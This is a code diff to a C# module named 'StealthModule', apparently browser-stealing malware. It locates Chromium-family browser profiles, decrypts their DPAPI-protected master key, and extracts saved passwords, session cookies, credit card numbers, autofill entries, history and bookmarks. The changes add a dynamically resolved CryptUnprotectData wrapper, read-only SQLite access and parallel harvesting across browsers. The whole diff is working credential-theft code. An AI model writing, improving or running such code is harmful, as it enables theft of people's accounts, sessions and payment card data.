@@ -55,31 +55,108 @@ namespace StealthModule
             public static T GetSqlite<T>(string func) where T : class { return GetPInvoke<T>("sqlite3.dll", func); }
             public static T GetBcrypt<T>(string func) where T : class { return GetPInvoke<T>("bcrypt.dll", func); }
             public static T GetCrypt32<T>(string func) where T : class { return GetPInvoke<T>("crypt32.dll", func); }
+
+            public static bool DecryptDPAPI(byte[] data, out byte[] output)
+            {
+                output = null;
+                var dataIn = new DATA_BLOB { cbData = (uint)data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
+                var dataOut = new DATA_BLOB();
+                try
+                {
+                    Marshal.Copy(data, 0, dataIn.pbData, data.Length);
+                    if (CryptUnprotectData(ref dataIn, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut))
+                    {
+                        output = new byte[dataOut.cbData];
+                        Marshal.Copy(dataOut.pbData, output, 0, (int)dataOut.cbData);
+                        return true;
+                    }
+                }
+                finally
+                {
+                    if (dataIn.pbData != IntPtr.Zero) Marshal.FreeHGlobal(dataIn.pbData);
+                    if (dataOut.pbData != IntPtr.Zero) GetK32<LocalFree_t>("LocalFree")(dataOut.pbData);
+                }
+                return false;
+            }
         }
+
+        private delegate IntPtr LocalFree_t(IntPtr hMem);
 
         // SQLite Delegates
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate int sqlite3_open(string filename, out IntPtr db);
-        private static sqlite3_open Sqlite3Open { get { return NativeApi.GetSqlite<sqlite3_open>("sqlite3_open"); } }
+        private delegate int sqlite3_open_v2(string filename, out IntPtr db, int flags, string vfs);
+        private static sqlite3_open_v2 Sqlite3OpenV2 { get { return NativeApi.GetSqlite<sqlite3_open_v2>("sqlite3_open_v2"); } }
+        
+        private const int SQLITE_OPEN_READONLY = 0x00000001;
+        private const int SQLITE_OPEN_NOMUTEX = 0x00008000;
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int sqlite3_close(IntPtr db);
         private static sqlite3_close Sqlite3Close { get { return NativeApi.GetSqlite<sqlite3_close>("sqlite3_close"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int sqlite3_prepare_v2(IntPtr db, string sql, int nByte, out IntPtr stmt, IntPtr tail);
         private static sqlite3_prepare_v2 Sqlite3PrepareV2 { get { return NativeApi.GetSqlite<sqlite3_prepare_v2>("sqlite3_prepare_v2"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int sqlite3_step(IntPtr stmt);
         private static sqlite3_step Sqlite3Step { get { return NativeApi.GetSqlite<sqlite3_step>("sqlite3_step"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate IntPtr sqlite3_column_text(IntPtr stmt, int iCol);
         private static sqlite3_column_text Sqlite3ColumnText { get { return NativeApi.GetSqlite<sqlite3_column_text>("sqlite3_column_text"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate IntPtr sqlite3_column_blob(IntPtr stmt, int iCol);
         private static sqlite3_column_blob Sqlite3ColumnBlob { get { return NativeApi.GetSqlite<sqlite3_column_blob>("sqlite3_column_blob"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int sqlite3_column_bytes(IntPtr stmt, int iCol);
         private static sqlite3_column_bytes Sqlite3ColumnBytes { get { return NativeApi.GetSqlite<sqlite3_column_bytes>("sqlite3_column_bytes"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long sqlite3_column_int64(IntPtr stmt, int iCol);
         private static sqlite3_column_int64 Sqlite3ColumnInt64 { get { return NativeApi.GetSqlite<sqlite3_column_int64>("sqlite3_column_int64"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int sqlite3_column_int(IntPtr stmt, int iCol);
         private static sqlite3_column_int Sqlite3ColumnInt { get { return NativeApi.GetSqlite<sqlite3_column_int>("sqlite3_column_int"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int sqlite3_finalize(IntPtr stmt);
         private static sqlite3_finalize Sqlite3Finalize { get { return NativeApi.GetSqlite<sqlite3_finalize>("sqlite3_finalize"); } }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool CryptUnprotectDataDelegate(ref DATA_BLOB pDataIn, IntPtr szDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);
+        private static CryptUnprotectDataDelegate CryptUnprotectData { get { return NativeApi.GetCrypt32<CryptUnprotectDataDelegate>("CryptUnprotectData"); } }
 
         // BCrypt Delegates
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate uint BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
         private static BCryptOpenAlgorithmProvider BcryptOpenAlg { get { return NativeApi.GetBcrypt<BCryptOpenAlgorithmProvider>("BCryptOpenAlgorithmProvider"); } }
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
         private static BCryptCloseAlgorithmProvider BcryptCloseAlg { get { return NativeApi.GetBcrypt<BCryptCloseAlgorithmProvider>("BCryptCloseAlgorithmProvider"); } }
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        private delegate uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);
         private static BCryptSetProperty BcryptSetProp { get { return NativeApi.GetBcrypt<BCryptSetProperty>("BCryptSetProperty"); } }
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
         private static BCryptDecrypt BcryptDec { get { return NativeApi.GetBcrypt<BCryptDecrypt>("BCryptDecrypt"); } }
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);
         private static BCryptGenerateSymmetricKey BcryptGenKey { get { return NativeApi.GetBcrypt<BCryptGenerateSymmetricKey>("BCryptGenerateSymmetricKey"); } }
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate uint BCryptDestroyKey(IntPtr hKey);
         private static BCryptDestroyKey BcryptDestKey { get { return NativeApi.GetBcrypt<BCryptDestroyKey>("BCryptDestroyKey"); } }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct DATA_BLOB { public uint cbData; public IntPtr pbData; }
 
         [StructLayout(LayoutKind.Sequential)]
         private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
@@ -151,11 +228,11 @@ namespace StealthModule
                 { "Liebao", Path.Combine(LocalAppData, "Liebao\\User Data") }
             };
 
-            foreach (var cfg in browserConfigs)
+            System.Threading.Tasks.Parallel.ForEach(browserConfigs, cfg =>
             {
-                if (!Directory.Exists(cfg.Value)) continue;
+                if (!Directory.Exists(cfg.Value)) return;
                 byte[] masterKey = GetMasterKey(cfg.Value);
-                if (masterKey == null) continue;
+                if (masterKey == null) return;
 
                 var profilePaths = new List<string>();
                 try
@@ -168,9 +245,23 @@ namespace StealthModule
 
                 foreach (var profile in profilePaths.Distinct())
                 {
-                    ExtractDataFromProfile(profile, cfg.Key, masterKey, passwords, cookies, tempFolder, cards, autofills, history, bookmarks);
+                    var p_pass = new List<Credential>();
+                    var p_cook = new List<Cookie>();
+                    var p_cards = new List<CreditCard>();
+                    var p_auto = new List<Autofill>();
+                    var p_hist = new List<HistoryEntry>();
+                    var p_bookmarks = new List<Bookmark>();
+
+                    ExtractDataFromProfile(profile, cfg.Key, masterKey, p_pass, p_cook, tempFolder, p_cards, p_auto, p_hist, p_bookmarks);
+
+                    lock (passwords) passwords.AddRange(p_pass);
+                    lock (cookies) cookies.AddRange(p_cook);
+                    lock (cards) cards.AddRange(p_cards);
+                    lock (autofill) autofills.AddRange(p_auto);
+                    lock (history) history.AddRange(p_hist);
+                    lock (bookmarks) bookmarks.AddRange(p_bookmarks);
                 }
-            }
+            });
 
             ExtractFirefoxData(passwords, cookies, tempFolder);
 
@@ -273,9 +364,11 @@ namespace StealthModule
                 var json = new JavaScriptSerializer().Deserialize<Dictionary<string, object>>(File.ReadAllText(ls)); 
                 var osCrypt = (Dictionary<string, object>)json["os_crypt"]; 
                 byte[] key = Convert.FromBase64String((string)osCrypt["encrypted_key"]).Skip(5).ToArray(); 
-                return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser); 
+                byte[] decrypted;
+                if (NativeApi.DecryptDPAPI(key, out decrypted)) return decrypted;
             }
-            catch { return null; }
+            catch { }
+            return null;
         }
 
         private static string Decrypt(byte[] data, byte[] key)
@@ -283,7 +376,10 @@ namespace StealthModule
             if (data == null || data.Length < 15) return "";
             string prefix = Encoding.UTF8.GetString(data, 0, 3);
             if (prefix == "v10" || prefix == "v11") return DecryptAesGcm(data.Skip(15).ToArray(), key, data.Skip(3).Take(12).ToArray());
-            try { return Encoding.UTF8.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser)); } catch { return ""; }
+            
+            byte[] decrypted;
+            if (NativeApi.DecryptDPAPI(data, out decrypted)) return Encoding.UTF8.GetString(decrypted);
+            return "";
         }
 
         private static string DecryptAesGcm(byte[] ciphertextWithTag, byte[] key, byte[] nonce)
@@ -324,7 +420,7 @@ namespace StealthModule
         #region Extraction Methods (SQLite)
         private static void ExtractPasswords(string dbPath, string browser, byte[] key, List<Credential> list)
         {
-            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
+            IntPtr db; if (Sqlite3OpenV2(dbPath, out db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, null) != 0) return; IntPtr stmt;
             if (Sqlite3PrepareV2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, out stmt, IntPtr.Zero) == 0)
             {
                 while (Sqlite3Step(stmt) == 100)
@@ -346,7 +442,7 @@ namespace StealthModule
 
         private static void ExtractCookies(string dbPath, string browser, byte[] key, List<Cookie> list)
         {
-            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
+            IntPtr db; if (Sqlite3OpenV2(dbPath, out db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, null) != 0) return; IntPtr stmt;
             if (Sqlite3PrepareV2(db, "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies", -1, out stmt, IntPtr.Zero) == 0)
             {
                 while (Sqlite3Step(stmt) == 100)
@@ -373,7 +469,9 @@ namespace StealthModule
 
         private static void ExtractCreditCards(string dbPath, string browser, byte[] key, List<CreditCard> list)
         {
-            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
+            IntPtr db; 
+            if (Sqlite3OpenV2(dbPath, out db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, null) != 0) return; 
+            IntPtr stmt;
             if (Sqlite3PrepareV2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, out stmt, IntPtr.Zero) == 0)
             {
                 while (Sqlite3Step(stmt) == 100)
@@ -395,7 +493,7 @@ namespace StealthModule
 
         private static void ExtractAutofill(string dbPath, string browser, List<Autofill> list)
         {
-            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
+            IntPtr db; if (Sqlite3OpenV2(dbPath, out db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, null) != 0) return; IntPtr stmt;
             if (Sqlite3PrepareV2(db, "SELECT name, value FROM autofill", -1, out stmt, IntPtr.Zero) == 0)
             {
                 while (Sqlite3Step(stmt) == 100)
@@ -408,7 +506,7 @@ namespace StealthModule
 
         private static void ExtractHistory(string dbPath, string browser, List<HistoryEntry> list)
         {
-            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
+            IntPtr db; if (Sqlite3OpenV2(dbPath, out db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, null) != 0) return; IntPtr stmt;
             if (Sqlite3PrepareV2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, out stmt, IntPtr.Zero) == 0)
             {
                 while (Sqlite3Step(stmt) == 100)
